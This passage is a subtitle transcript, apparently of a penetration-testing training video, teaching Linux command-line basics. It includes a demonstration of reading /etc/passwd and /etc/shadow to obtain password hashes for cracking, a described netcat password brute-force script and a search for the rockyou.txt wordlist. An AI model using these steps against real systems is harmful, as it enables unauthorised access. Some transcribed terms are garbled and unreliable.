00:26:04.378\nCuz you're gonna do this a lot.\n\n564\n00:26:04.378 --> 00:26:07.720\nYou're gonna be sending\nthe output of one program, or\n\n565\n00:26:07.720 --> 00:26:10.560\nfile, or\nwhatever into the input of another.\n\n566\n00:26:10.560 --> 00:26:12.520\nYou're gonna be sending it to a file.\n\n567\n00:26:12.520 --> 00:26:16.130\nMaybe you're gonna look at\nthe contents of one file, and\n\n568\n00:26:16.130 --> 00:26:18.670\nsend that into another file, right?\n\n569\n00:26:18.670 --> 00:26:19.940\nThese are things you're gonna be doing.\n\n570\n00:26:19.940 --> 00:26:22.380\nYou have a few operands\nthat can help you do that.\n\n571\n00:26:22.380 --> 00:26:24.210\nThe greater than signs or\nthe less than sign.\n\n572\n00:26:24.210 --> 00:26:26.560\nTypically it's gonna be\nthe greater than sign.\n\n573\n00:26:26.560 --> 00:26:28.090\nSometimes it'll be the less than sign, so.\n\n574\n00:26:28.090 --> 00:26:29.880\nLet's show you how to\ndo that really quickly.\n\n575\n00:26:29.880 --> 00:26:32.530\nI can do things like, let's see here.\n\n576\n00:26:32.530 --> 00:26:33.974\nLet me get back into /root.\n\n577\n00:26:35.120 --> 00:26:37.478\nAnd say, like, echo.\n\n578\n00:26:39.077 --> 00:26:44.523\nThis is a great file, and\nthen redirect that into superfile1.txt,\n\n579\n00:26:44.523 --> 00:26:50.360\nand you can give it any extension,\nLinux doesn't care, and there you go.\n\n580\n00:26:50.360 --> 00:26:55.132\nNow I can cat superfile1.txt, and\nthis is, this is a great file.\n\n581\n00:26:55.132 --> 00:27:00.520\nSo I've redirected the output of\necho into a file and saved it.\n\n582\n00:27:00.520 --> 00:27:05.620\nI do that a lot when it comes to\nmy command line like scanners or\n\n583\n00:27:05.620 --> 00:27:07.620\nthings when they create output.\n\n584\n00:27:07.620 --> 00:27:12.540\nTypically all these thing have an output\noption but there is a million of them.\n\n585\n00:27:12.540 --> 00:27:17.030\nYeah there is not it's easier just for me\nto go while greater than file name, right,\n\n586\n00:27:17.030 --> 00:27:18.680\nI know that will work.\n\n587\n00:27:18.680 --> 00:27:20.080\nAnd I don't have to learn another option.\n\n588\n00:27:20.080 --> 00:27:22.440\nSo that's typically what I'll do.\n\n589\n00:27:22.440 --> 00:27:23.690\nThat way I can go back later.\n\n590\n00:27:23.690 --> 00:27:24.910\nTake a look at that output.\n\n591\n00:27:24.910 --> 00:27:25.610\nPeruse through it.\n\n592\n00:27:25.610 --> 00:27:27.260\nIt's saved as a flat file.\n\n593\n00:27:27.260 --> 00:27:27.860\nIt's super easy.\n\n594\n00:27:27.860 --> 00:27:31.220\nJust whip out your text editor if you\nwanna make changes to it and there you go.\n\n595\n00:27:31.220 --> 00:27:32.590\nThere's like information.\n\n596\n00:27:32.590 --> 00:27:36.760\nThat's probably one of the biggest keys as\nwe're starting about penetration testing.\n\n597\n00:27:36.760 --> 00:27:37.980\nKeep things in order, right.\n\n598\n00:27:37.980 --> 00:27:42.370\nYou wanna have an order in which you\ndo things, not just haphazardly,\n\n599\n00:27:42.370 --> 00:27:45.620\nthrowing everything and the kitchen\nsink at it and hope something sticks.\n\n600\n00:27:45.620 --> 00:27:50.810\nYou want to go okay, I'm gonna start with\nscanning this, building that, looking\n\n601\n00:27:50.810 --> 00:27:56.000\nup hosts, doing that, and then you keep a\nfile structure that is in line with that.\n\n602\n00:27:56.000 --> 00:28:01.720\nIf I wanna Nmap scan, I keep my file\ncalled this hosts name slash end map.\n\n603\n00:28:01.720 --> 00:28:04.610\nRight?\nI know that's the nmap scan for that host.\n\n604\n00:28:04.610 --> 00:28:06.660\nAnd I can just open it and\nI can go back to it anytime I want.\n\n605\n00:28:07.820 --> 00:28:08.960\nWait, cuz let me tell you\n&gt;&gt; [LAUGH]\n\n606\n00:28:08.960 --> 00:28:10.030\n&gt;&gt; Some of those nmap scans\n\n607\n00:28:10.030 --> 00:28:12.240\ncan get a little long in the tooth.\n\n608\n00:28:12.240 --> 00:28:15.055\nYou're like, man I shouldn't have\ndone UDP, that was a mistake.\n\n609\n00:28:15.055 --> 00:28:16.460\n&gt;&gt; [LAUGH]\n&gt;&gt; That was a mistake.\n\n610\n00:28:16.460 --> 00:28:17.600\nExcept it found that open port.\n\n611\n00:28:17.600 --> 00:28:18.512\nNow I got into the box, so.\n\n612\n00:28:18.512 --> 00:28:19.020\n[LAUGH]\n&gt;&gt; [LAUGH] Yeah.\n\n613\n00:28:19.020 --> 00:28:23.656\nOr when you're working on a network and\nthere's 50, 100, 250 live hosts.\n\n614\n00:28:23.656 --> 00:28:25.812\nAnd you're trying to do\nport scans on all those.\n\n615\n00:28:25.812 --> 00:28:29.696\nKeeping that stuff organized and\nstraight, very important part.\n\n616\n00:28:29.696 --> 00:28:30.740\n&gt;&gt; Yeah.\n\n617\n00:28:30.740 --> 00:28:32.880\nAnother thing you wanna do,\nreally quickly, is grep.\n\n618\n00:28:32.880 --> 00:28:36.230\nYou definitely wanna get\ncomfortable with grep.\n\n619\n00:28:36.230 --> 00:28:39.294\nIf you're not comfortable with grep,\ndefinitely run to our Linux shows.\n\n620\n00:28:39.294 --> 00:28:41.530\n[LAUGH] Find that in there.\n\n621\n00:28:41.530 --> 00:28:44.170\nI'm trying to think\nwhat it would be under.\n\n622\n00:28:44.170 --> 00:28:45.470\nI'll think of it later.\n\n623\n00:28:45.470 --> 00:28:47.340\nAnd learn how to use grep.\n\n624\n00:28:47.340 --> 00:28:50.320\nYou can always jump to the man page,\nbelieve it or not, and\n\n625\n00:28:50.320 --> 00:28:53.630\nlearn just about everything you'd ever\nwanna know about how to use grep.\n\n626\n00:28:53.630 --> 00:28:55.040\nIt's a fantastic tool, and\n\n627\n00:28:55.040 --> 00:28:58.080\nbasically it just pulls out information\nthat you tell it to look for.\n\n628\n00:28:58.080 --> 00:29:03.091\nSo if I've got a file full of IP\naddresses and I'm looking for one,\n\n629\n00:29:03.091 --> 00:29:09.373\nwhat was the one that had, that had the\nvulnerability or port 3, 2, 3 was open.\n\n630\n00:29:09.373 --> 00:29:14.120\nThat's the one I'm looking for while I can\ngrep port 3, 2, 3 and it will find that.\n\n631\n00:29:14.120 --> 00:29:17.230\nSo, we'll take our little\nsuperfile1 here as an example.\n\n632\n00:29:17.230 --> 00:29:19.560\nWe'll put some content in there,\nhow about that?\n\n633\n00:29:19.560 --> 00:29:24.333\nNano and nano's one of my favorite text\neditors because it's a little more\n\n634\n00:29:24.333 --> 00:29:27.147\nsimple than vi, learn vi, learn to use vi.\n\n635\n00:29:27.147 --> 00:29:29.850\nBut I like nano for ease of use.\n\n636\n00:29:29.850 --> 00:29:33.260\nAnd we'll say, superfile1 here,\nI'm just gonna add some content.\n\n637\n00:29:33.260 --> 00:29:39.437\nSo this is another string of text,\n\n638\n00:29:39.437 --> 00:29:46.042\nyet another, and still more again.\n\n639\n00:29:46.042 --> 00:29:47.666\nAll right, so just simple text, right?\n\n640\n00:29:47.666 --> 00:29:51.500\nSave that if I can.\n\n641\n00:29:51.500 --> 00:29:52.070\nX.\n\n642\n00:29:52.070 --> 00:29:53.270\nAnd now I can use grep.\n\n643\n00:29:53.270 --> 00:29:54.370\nI say which line.\n\n644\n00:29:54.370 --> 00:29:56.340\nWe'll pretend this was\na multi thousand line thing.\n\n645\n00:29:56.340 --> 00:29:57.810\nI'll say man which one.\n\n646\n00:29:57.810 --> 00:29:59.350\nIt said yet something.\n\n647\n00:29:59.350 --> 00:30:00.290\nI can't remember what it was.\n\n648\n00:30:00.290 --> 00:30:04.450\nSo I can cat superfile and then pipe that.\n\n649\n00:30:04.450 --> 00:30:05.650\nYou use your pipe operander.\n\n650\n00:30:05.650 --> 00:30:08.340\nIt's the one right above\nyour Return key usually,\n\n651\n00:30:08.340 --> 00:30:11.510\nit's got the backslash on it sometimes,\nor all the time I think.\n\n652\n00:30:11.510 --> 00:30:16.120\nAnd then you just type grep and\nthen whatever you're looking for.\n\n653\n00:30:16.120 --> 00:30:18.100\nSo I'm looking for the term yet.\n\n654\n00:30:18.100 --> 00:30:20.110\nLook, there it is, it shows me that line.\n\n655\n00:30:20.110 --> 00:30:22.970\nWhatever's on that line,\nit'll show me everything.\n\n656\n00:30:22.970 --> 00:30:27.650\nThen you can use things like cut or\nsaid, or together to cut out those.\n\n657\n00:30:27.650 --> 00:30:29.550\nAgain, man that stuff, right, man cut.\n\n658\n00:30:29.550 --> 00:30:33.350\nIt removes sections\nfrom each line of file.\n\n659\n00:30:33.350 --> 00:30:34.620\nSo if I wanna take stuff out,\n\n660\n00:30:34.620 --> 00:30:39.130\nthis is gonna help you out a lot when you\ndo have these long, drawn out systems.\n\n661\n00:30:39.130 --> 00:30:40.410\nMy goodness, so much information,\n\n662\n00:30:40.410 --> 00:30:44.260\nand you want to just get\ncertain information out of it.\n\n663\n00:30:44.260 --> 00:30:49.850\nYou use grep to pipe that into sed,\npipe that into cut, and start removing\n\n664\n00:30:49.850 --> 00:30:54.470\ninformation so that you only are left\nwith exactly what you're looking for.\n\n665\n00:30:54.470 --> 00:30:57.550\nCuz there's usually a lot of extraneous\ninformation with these outputs.\n\n666\n00:30:57.550 --> 00:31:02.644\nSo that can definitely be your sed\nis another one, obviously man sed.\n\n667\n00:31:02.644 --> 00:31:05.710\nIt's the stream editor for\nfiltering and transforming text.\n\n668\n00:31:05.710 --> 00:31:08.830\nVery cool,\nvery powerful piece of software.\n\n669\n00:31:08.830 --> 00:31:10.840\nThey've written whole books on this thing.\n\n670\n00:31:10.840 --> 00:31:13.770\nBut definitely learn to\nuse the basics on that.\n\n671\n00:31:13.770 --> 00:31:16.240\n&gt;&gt; Yeah,\nunbelievably how powerful those tools are.\n\n672\n00:31:16.240 --> 00:31:18.590\nAnd you think they're just simple\nlittle command line tools.\n\n673\n00:31:18.590 --> 00:31:22.280\nBut you take an nmap result for example,\nlet's say you scan a class E network.\n\n674\n00:31:22.280 --> 00:31:25.310\nYou get 254 possible hosts.\n\n675\n00:31:25.310 --> 00:31:27.860\nWell when you look at that output,\nyou save it to a file.\n\n676\n00:31:27.860 --> 00:31:31.720\nThe first few lines are like repeating\nyour command, nmap, the version number.\n\n677\n00:31:31.720 --> 00:31:33.535\nNone of that's necessary for\nwhat I wanna do.\n\n678\n00:31:33.535 --> 00:31:36.870\nI wanna do a deeper scan but\nonly on a live host.\n\n679\n00:31:36.870 --> 00:31:39.410\nSo all I need is the IP addresses.\n\n680\n00:31:39.410 --> 00:31:42.644\nBy using a combination of grep and\nlooking for the word up, for example,\n\n681\n00:31:42.644 --> 00:31:44.932\nI can eliminate all the other\nlines in that output.\n\n682\n00:31:44.932 --> 00:31:48.838\nAnd then I start using cut to take that\nsecond column where it's just the IP\n\n683\n00:31:48.838 --> 00:31:50.666\naddress, and before you know it,\n\n684\n00:31:50.666 --> 00:31:54.007\nI end up with a file that's just\nIP address one after the other,\n\n685\n00:31:54.007 --> 00:31:57.754\none on each line That I can turn around\nand feed into any other command.\n\n686\n00:31:57.754 --> 00:32:02.750\nIt's extremely time saving, I guess.\n\n687\n00:32:02.750 --> 00:32:06.290\nIf you learn these tools, learn how to\nuse them, it can be very beneficial, and\n\n688\n00:32:06.290 --> 00:32:08.740\nmake your penetration\ntesting more efficient.\n\n689\n00:32:08.740 --> 00:32:10.240\n&gt;&gt; That's exactly right.\n\n690\n00:32:10.240 --> 00:32:12.540\nAll right, that being said,\nI know we're running short on time, so\n\n691\n00:32:12.540 --> 00:32:15.560\nwe wanna kinda get through\nsome more foundational stuff.\n\n692\n00:32:15.560 --> 00:32:16.760\nLet us talk about scripting.\n\n693\n00:32:16.760 --> 00:32:19.430\nYou definitely need to know\nhow to do bash scripting.\n\n694\n00:32:19.430 --> 00:32:23.250\nIf you do not know how to do\nbash scripting well guess what\n\n695\n00:32:23.250 --> 00:32:24.080\nwelcome to ITPROTV.\n\n696\n00:32:24.080 --> 00:32:27.595\nWhere we actually have a course and\nI am not gonna lie it's good.\n\n697\n00:32:27.595 --> 00:32:29.400\n&gt;&gt; [LAUGH]\n&gt;&gt; It is fantastic.\n\n698\n00:32:29.400 --> 00:32:31.060\nIf I do say so myself\n&gt;&gt; Who was that?\n\n699\n00:32:31.060 --> 00:32:34.090\n&gt;&gt; I do not know who was that who\nasked me on that right it was me.\n\n700\n00:32:34.090 --> 00:32:37.940\nI am kidding around I hopefully you\nguys will like it I try to do a good job\n\n701\n00:32:37.940 --> 00:32:40.000\nI'm presenting that information.\n\n702\n00:32:40.000 --> 00:32:42.900\nAnd if you don't know scripting,\nspecifically bash scripting,\n\n703\n00:32:42.900 --> 00:32:44.880\nthat's what we're talking about,\ngo check that show out.\n\n704\n00:32:44.880 --> 00:32:46.510\nIt's not that long.\n\n705\n00:32:46.510 --> 00:32:47.730\nIt's not even that complex.\n\n706\n00:32:47.730 --> 00:32:50.250\nI tried to make it simple and practical so\n\n707\n00:32:50.250 --> 00:32:53.300\nthat you can get that stuff\nunderneath your belt.\n\n708\n00:32:53.300 --> 00:32:54.360\nLet's do take a look at my computer.\n\n709\n00:32:54.360 --> 00:32:56.800\nI'm gonna show you some of the things\nyou can do with bash scripting.\n\n710\n00:32:56.800 --> 00:33:01.130\nThis is a script that I wrote when\nI was learning some bash scripting.\n\n711\n00:33:02.370 --> 00:33:06.080\nSo this is actually a brute force for\nour password.\n\n712\n00:33:06.080 --> 00:33:08.230\nYeah, and you're like,\na brute force for a password?\n\n713\n00:33:08.230 --> 00:33:12.470\nYep, basically what I'm doing here is I'm\nechoing, now this is very rudimentary,\n\n714\n00:33:12.470 --> 00:33:14.615\nthis is very, this is bad code,\nto be honest with you.\n\n715\n00:33:14.615 --> 00:33:17.150\n&gt;&gt; [LAUGH]\n&gt;&gt; I could do this a whole lot better now,\n\n716\n00:33:17.150 --> 00:33:21.790\nbut it shows you the power of\neven learning some simple basics\n\n717\n00:33:21.790 --> 00:33:24.410\nof bash scripting of what\nyou can do with that.\n\n718\n00:33:24.410 --> 00:33:28.170\nAnd what I've done is basically I'm doing\nit if loop so you need to know loops,\n\n719\n00:33:28.170 --> 00:33:30.870\nall right no I'm sorry if it's not\nloop if is a conditional statement.\n\n720\n00:33:30.870 --> 00:33:36.490\nSo if this then that kinda thing so\nthat your scripts can make decisions,\n\n721\n00:33:36.490 --> 00:33:41.490\nand then there's loops you gotta learn\nloops on do this until this is done\n\n722\n00:33:41.490 --> 00:33:44.960\nkinda thing or wow this is true do this.\n\n723\n00:33:44.960 --> 00:33:46.430\nThat's the idea you're looking for.\n\n724\n00:33:46.430 --> 00:33:47.950\nYou'll understand what variables are.\n\n725\n00:33:47.950 --> 00:33:50.320\nBasically containers for information.\n\n726\n00:33:50.320 --> 00:33:52.880\nSo you feed a variable some information.\n\n727\n00:33:52.880 --> 00:33:55.450\nAnd then it uses the variable\n\n728\n00:33:55.450 --> 00:33:58.060\nas that information throughout\nthe rest of your script.\n\n729\n00:33:58.060 --> 00:34:00.250\nYou can modify it, change it,\ndo certain things with it.\n\n730\n00:34:00.250 --> 00:34:01.530\nVery cool stuff.\n\n731\n00:34:01.530 --> 00:34:05.580\nDefinitely, if you don't know anything\nabout scripting, you'll want to go and\n\n732\n00:34:05.580 --> 00:34:07.000\nwatch that show, to be honest with you.\n\n733\n00:34:07.000 --> 00:34:09.090\nIt's going to be a big help.\n\n734\n00:34:09.090 --> 00:34:13.200\nI have to assume that this point\nthat you can do this cuz otherwise\n\n735\n00:34:13.200 --> 00:34:14.540\nwe're gonna do a bash scripting show.\n\n736\n00:34:14.540 --> 00:34:16.150\nAnd we'll never get out of here.\n\n737\n00:34:16.150 --> 00:34:19.880\nBut I can use this as an example so\nthat you can see some of those things.\n\n738\n00:34:19.880 --> 00:34:21.450\nSo let's take a look really quickly.\n\n739\n00:34:21.450 --> 00:34:26.970\nI have a while loop, so\nwhile I does not equal 10,000.\n\n740\n00:34:26.970 --> 00:34:28.310\nDo this if statement.\n\n741\n00:34:28.310 --> 00:34:34.750\nSo if i is less than 10 then echo this\nstring which was part of the password.\n\n742\n00:34:34.750 --> 00:34:38.800\nAnd basically it was a salted\npassword with a 4 digit number.\n\n743\n00:34:38.800 --> 00:34:42.470\nSo you had a password and then you\nhad to come up with a 4 digit number\n\n744\n00:34:42.470 --> 00:34:45.160\nadded to that, but\nI know what that four digit number was.\n\n745\n00:34:45.160 --> 00:34:49.660\nSo I had to have the computer\nfigure out what it was for me.\n\n746\n00:34:51.260 --> 00:34:53.550\nSo it adds a, which a equal 0000.\n\n747\n00:34:53.550 --> 00:35:01.560\nA little caveat to the script\nwas number zero was 0000.\n\n748\n00:35:01.560 --> 00:35:03.120\nThe next number was 0001.\n\n749\n00:35:03.120 --> 00:35:06.730\nRemember, it had to be four digits\neven if the other digits were 0.\n\n750\n00:35:06.730 --> 00:35:07.810\nI couldn't just go 2345.\n\n751\n00:35:07.810 --> 00:35:10.970\nSo I had to finagle that around.\n\n752\n00:35:10.970 --> 00:35:14.700\nAnd then I used netcat to make\nthe actual connection to the host.\n\n753\n00:35:14.700 --> 00:35:18.610\nSo it would pump that information into\nnetcat basically trying to log in.\n\n754\n00:35:18.610 --> 00:35:20.570\nAnd then let me know whether or\nnot I was successful.\n\n755\n00:35:20.570 --> 00:35:22.160\nIf it wasn't, it incremented.\n\n756\n00:35:22.160 --> 00:35:26.660\nThis is that ++ idea that\nC style incrementation.\n\n757\n00:35:27.750 --> 00:35:29.210\nAnd then it would go to the next.\n\n758\n00:35:29.210 --> 00:35:30.980\nSo if it went, 0001, it didn't work.\n\n759\n00:35:30.980 --> 00:35:31.730\nOkay, 0002, it didn't work.\n\n760\n00:35:31.730 --> 00:35:33.170\nAnd so on and so forth.\n\n761\n00:35:33.170 --> 00:35:35.820\nOf course we're gonna talk\nmore about brute forcing.\n\n762\n00:35:35.820 --> 00:35:40.130\nBut I did that with basic, this is very,\nvery basic bash scripting.\n\n763\n00:35:40.130 --> 00:35:43.809\nAnd I was able successfully took two\nhours for it to run and complete, but\n\n764\n00:35:43.809 --> 00:35:46.180\nbasic skills will get you there.\n\n765\n00:35:46.180 --> 00:35:47.330\nLet's see here.\n\n766\n00:35:47.330 --> 00:35:48.330\nSoftware installation.\n\n767\n00:35:48.330 --> 00:35:49.160\nGot to know how to do that.\n\n768\n00:35:49.160 --> 00:35:51.150\nLet me pump back over to my computer here.\n\n769\n00:35:51.150 --> 00:35:53.600\nIf you want to install\nsomething use the apt.\n\n770\n00:35:53.600 --> 00:35:55.420\nIf you're gonna Ubuntu system use apt-get.\n\n771\n00:35:55.420 --> 00:35:57.820\nIf you're running some\nsort of Red Hat variance.\n\n772\n00:35:57.820 --> 00:35:59.840\nI say Ubuntu, it's really deviant.\n\n773\n00:35:59.840 --> 00:36:03.512\nAny deviant system that uses\nkind of the .dev stuff.\n\n774\n00:36:03.512 --> 00:36:07.110\nYou wanna be able to use\nthe apt-get system in there.\n\n775\n00:36:07.110 --> 00:36:12.580\nIf it's a Red Hat, Fedora variant then\nyou're gonna use the yum installation.\n\n776\n00:36:12.580 --> 00:36:14.720\nSo you gotta be familiar with those.\n\n777\n00:36:14.720 --> 00:36:20.730\nAnd really simple, so it's just\nbasically apt-get install package name.\n\n778\n00:36:20.730 --> 00:36:24.240\nSo if I wanted MariaDB or\nwhatever the case is.\n\n779\n00:36:24.240 --> 00:36:25.250\nI would pipe that in there.\n\n780\n00:36:25.250 --> 00:36:26.550\nI can't think of anything\noff the top of my head to\n\n781\n00:36:26.550 --> 00:36:27.685\ninstall that I don't already have.\n\n782\n00:36:27.685 --> 00:36:29.310\n[LAUGH] Cuz I'm running Golly Linux.\n\n783\n00:36:29.310 --> 00:36:30.630\nIt's an amazing piece of software.\n\n784\n00:36:30.630 --> 00:36:33.690\nIt really is people,\nI don't know what to tell you.\n\n785\n00:36:33.690 --> 00:36:36.900\nAnd then Yum would be\nsimilar to Yum install.\n\n786\n00:36:36.900 --> 00:36:40.790\nWhatever, if you're not logged in as root\nas I am by the way, that's a bad idea.\n\n787\n00:36:40.790 --> 00:36:44.100\nI know right, but it's a test box so\nI don't really care.\n\n788\n00:36:44.100 --> 00:36:47.895\nYou would have to do sudu like so.\n\n789\n00:36:47.895 --> 00:36:49.970\nSo don't forget that.\n\n790\n00:36:49.970 --> 00:36:51.310\nLet's see what else do we need to know?\n\n791\n00:36:51.310 --> 00:36:51.928\nNetworking!\n\n792\n00:36:51.928 --> 00:36:52.490\nAll right.\n\n793\n00:36:52.490 --> 00:36:57.397\nNetworking is a lot of fun, gotta\nunderstand how to make sure get your i-p\n\n794\n00:36:57.397 --> 00:37:02.390\naddress, how do I get into my\nd-h-c-p address if I need to?\n\n795\n00:37:02.390 --> 00:37:04.130\nYou gotta know these things.\n\n796\n00:37:04.130 --> 00:37:07.350\nSo, let's go back to the machine here.\n\n797\n00:37:07.350 --> 00:37:09.610\nLet's clear it out maybe.\n\n798\n00:37:09.610 --> 00:37:13.600\nSo, run ifconfig,\nlike that lot of networking information.\n\n799\n00:37:13.600 --> 00:37:16.540\nAlso an ip addr like so.\n\n800\n00:37:16.540 --> 00:37:19.310\nAlso it's kind of the new\nwave of ifconfig.\n\n801\n00:37:20.750 --> 00:37:22.760\nGet familiar with both of\nthose to be honest with you.\n\n802\n00:37:22.760 --> 00:37:26.250\nAt this point I have config\nnot completely doodled yet.\n\n803\n00:37:26.250 --> 00:37:27.460\nSo learn both.\n\n804\n00:37:29.130 --> 00:37:31.550\nLearn how to SSH into something.\n\n805\n00:37:31.550 --> 00:37:36.430\nSo if I wanted to SSH into an SSH\nserver secure shell, definitely\n\n806\n00:37:36.430 --> 00:37:39.590\nsomething you're gonna need to know for\nthis series to be honest with you.\n\n807\n00:37:39.590 --> 00:37:43.940\nSSH, and then I can do this box thing,\nget this running, SSH, [INAUDIBLE] one.\n\n808\n00:37:46.440 --> 00:37:47.930\nAnd it's asking for our password.\n\n809\n00:37:49.620 --> 00:37:51.835\nThat's not my password,\nI'm typing the wrong one.\n\n810\n00:37:51.835 --> 00:37:53.650\n&gt;&gt; [LAUGH]\n&gt;&gt; Fun, I can't type.\n\n811\n00:37:53.650 --> 00:37:55.480\nBut anyway, you get the idea,\nthere you go.\n\n812\n00:37:55.480 --> 00:37:57.160\nType in your password, you log in.\n\n813\n00:37:57.160 --> 00:37:59.220\nYou get a shell prompt just like\nwhat you're looking at here.\n\n814\n00:37:59.220 --> 00:38:01.960\nYou're gonna be doing some SSHing,\nwe're gonna be doing things like that.\n\n815\n00:38:01.960 --> 00:38:04.180\nTelnet is the same kind of idea.\n\n816\n00:38:04.180 --> 00:38:08.298\nI have config basics on DH client is for\n\n817\n00:38:08.298 --> 00:38:15.750\nget the DHCP, basically that release and\nrenew kinda thing.\n\n818\n00:38:15.750 --> 00:38:21.400\nYou do a -r to kinda release it and\ntell it what it is.\n\n819\n00:38:21.400 --> 00:38:23.770\nSo this is eth 1.\n\n820\n00:38:23.770 --> 00:38:27.520\nThat would be,\nI think that's what it is over here.\n\n821\n00:38:27.520 --> 00:38:31.560\nYeah, so we have eth1 and eth0 on\nthis one, and there's my IP address.\n\n822\n00:38:31.560 --> 00:38:34.300\nSo if I wanted to release that,\nI would say, eth1.\n\n823\n00:38:34.300 --> 00:38:37.600\nLet it know that's\nthe device I wanna release.\n\n824\n00:38:37.600 --> 00:38:40.010\nAnd then if I wanna get it\nback I just do the same thing,\n\n825\n00:38:40.010 --> 00:38:43.070\nexcept for -r, just do a -v so\nyou can see what's happening.\n\n826\n00:38:43.070 --> 00:38:46.000\nMake sure that door\nprocess gets completed.\n\n827\n00:38:46.000 --> 00:38:46.630\nWhere are we?\n\n828\n00:38:46.630 --> 00:38:47.740\nYeah.\nNow we're coming back to our\n\n829\n00:38:47.740 --> 00:38:49.210\nlittle teaser.\n\n830\n00:38:49.210 --> 00:38:49.800\nAlmost done Mike.\n\n831\n00:38:49.800 --> 00:38:51.190\nI know we're going overtime.\n\n832\n00:38:51.190 --> 00:38:52.080\nAlmost done.\n\n833\n00:38:52.080 --> 00:38:54.800\nI don't mind and I know our\nviewers don't mind at this point.\n\n834\n00:38:54.800 --> 00:38:55.417\n&gt;&gt; Yeah, good stuff.\n\n835\n00:38:55.417 --> 00:38:57.330\n&gt;&gt; They're hating our life right now.\n\n836\n00:38:57.330 --> 00:38:59.250\nYou gotta know where\nthe passwords are in this thing.\n\n837\n00:38:59.250 --> 00:39:03.340\nBecause as a hacker,\nI kinda want that information, right?\n\n838\n00:39:03.340 --> 00:39:07.710\nThat's something you may be interested in\nthat if you're any kind of pen tester or\n\n839\n00:39:07.710 --> 00:39:08.770\nhacker minded.\n\n840\n00:39:08.770 --> 00:39:09.940\nSo where are those stored?\n\n841\n00:39:09.940 --> 00:39:11.370\nLet me clear this out yet again.\n\n842\n00:39:13.830 --> 00:39:17.490\nIf you cd to /etc you can cat or\n\n843\n00:39:17.490 --> 00:39:23.350\njust do cats/etc/,\nfirst one is password, like so.\n\n844\n00:39:23.350 --> 00:39:27.715\nThis will show you all the users that are\non the system, among many groups as well,\n\n845\n00:39:27.715 --> 00:39:33.930\nbut cuz most users have a group so\nyou get all in one package.\n\n846\n00:39:33.930 --> 00:39:35.980\nYou'll notice that I've got\na couple of users for FTP,\n\n847\n00:39:35.980 --> 00:39:40.060\nI was playing around with my FTP box so\nI put those in here.\n\n848\n00:39:41.440 --> 00:39:44.060\nIf I wanna integrate users,\nI wanna know whose on this system.\n\n849\n00:39:44.060 --> 00:39:46.740\nWell there you go,\nI need that FT password.\n\n850\n00:39:46.740 --> 00:39:50.560\nBack in the day, this is where\nthe password was actually stored.\n\n851\n00:39:50.560 --> 00:39:51.680\nThey put the password in here.\n\n852\n00:39:51.680 --> 00:39:55.419\nI wanna say it was at one\ntime even plain text.\n\n853\n00:39:55.419 --> 00:39:55.977\n&gt;&gt; Wow.\n\n854\n00:39:55.977 --> 00:39:59.169\n&gt;&gt; So but only root had access or\npeople with the right privileges.\n\n855\n00:39:59.169 --> 00:40:02.233\nActually probably back then,\nback in the day day, maybe well,\n\n856\n00:40:02.233 --> 00:40:06.206\nnobody knows what that file is anyways,\nso we'll just put the passwords in there,\n\n857\n00:40:06.206 --> 00:40:07.769\nthat's probably the mind set.\n\n858\n00:40:07.769 --> 00:40:09.710\nAnd then someone grabbed passwords and\nsaid,\n\n859\n00:40:09.710 --> 00:40:12.907\nmaybe we should do something about that,\nand they added a little security.\n\n860\n00:40:12.907 --> 00:40:17.277\nSo they did that, and now there's a,\nI think the md5 hashed values,\n\n861\n00:40:17.277 --> 00:40:21.294\nI'm pretty sure that's what they are now,\nI'm not 100%.\n\n862\n00:40:21.294 --> 00:40:25.060\nIt'll tell you in your\ndistribution what they're using.\n\n863\n00:40:25.060 --> 00:40:26.810\nBut then you need to know\nabout the SE shadow file,\n\n864\n00:40:26.810 --> 00:40:30.180\nwhich is where the passwords\nare actually stored.\n\n865\n00:40:30.180 --> 00:40:34.920\nAnd only roots,\nonly if thou art the great one\n\n866\n00:40:34.920 --> 00:40:37.910\nof the machine will you\nget access to that.\n\n867\n00:40:37.910 --> 00:40:39.268\nSo let's take a look at\nwhat that looks like.\n\n868\n00:40:39.268 --> 00:40:45.570\ncat shadow, and there you go,\nso this right here,\n\n869\n00:40:46.910 --> 00:40:53.390\nthis, all this mess, is the actual\npassword for this machine, bing.\n\n870\n00:40:53.390 --> 00:40:58.540\nIt's a lot of stuff, right,\na lot of information going on in there.\n\n871\n00:40:58.540 --> 00:40:59.430\nThese are the files.\n\n872\n00:40:59.430 --> 00:41:03.190\nThis file, specifically, is what\nyou'll need to do password cracking.\n\n873\n00:41:03.190 --> 00:41:06.660\nSo, I need to snatch the contents of\nthis file, so I can run that through\n\n874\n00:41:06.660 --> 00:41:10.530\nmy password cracker and find out what this\nguy's password is, so that I can break in.\n\n875\n00:41:10.530 --> 00:41:12.000\nWe will be doing password cracking,\n\n876\n00:41:12.000 --> 00:41:14.560\nnot just talking about password,\nwe will do password cracking.\n\n877\n00:41:14.560 --> 00:41:16.922\nIt will crack passwords, it will be fun.\n\n878\n00:41:16.922 --> 00:41:20.980\nAll right, find and locate,\nso you can find things,\n\n879\n00:41:20.980 --> 00:41:23.510\nyou need to find a file from time to time.\n\n880\n00:41:23.510 --> 00:41:26.630\nSomething like the big word list for\n\n881\n00:41:26.630 --> 00:41:28.560\na dictionary attack on a password,\nit's a good one.\n\n882\n00:41:28.560 --> 00:41:31.575\nSo I'll find one of the find,\nyou use find command.\n\n883\n00:41:31.575 --> 00:41:37.110\nSlash, or if I wanna name a specific\ndirectory that I wanna look in,\n\n884\n00:41:37.110 --> 00:41:38.880\nthis, I'm just gonna go with the root.\n\n885\n00:41:38.880 --> 00:41:42.530\nLook everywhere, look and\nstart at the top and go all the way down.\n\n886\n00:41:42.530 --> 00:41:46.128\nTell it / -name,\nwhat is the name of the file?\n\n887\n00:41:46.128 --> 00:41:51.950\nIt is rockyou.txt,\nit's a good file to get familiar with.\n\n888\n00:41:51.950 --> 00:41:54.190\nAnd then I like to tag this on the end, so\n\n889\n00:41:54.190 --> 00:41:57.580\nI don't get a bunch of errors,\nespecially if I'm not logged in as root.\n\n890\n00:41:57.580 --> 00:42:00.481\nIf you do 2/dev/null like that,\n\n891\n00:42:00.481 --> 00:42:05.010\nthat 2 lets it know that\nthat's the error messages.\n\n892\n00:42:05.010 --> 00:42:10.290\nAny error messages, send that to\n/dev/null, which is basically nowhere.\n\n893\n00:42:10.290 --> 00:42:12.210\nIt's a nothing bucket.\n\n894\n00:42:12.210 --> 00:42:14.110\nJust put those there, so\nI don't wanna see it.\n\n895\n00:42:14.110 --> 00:42:19.410\nSo instead of pumping them out to the\nstandard output, run that out to dev/null,\n\n896\n00:42:19.410 --> 00:42:21.110\nI don't wanna see it.\n\n897\n00:42:21.110 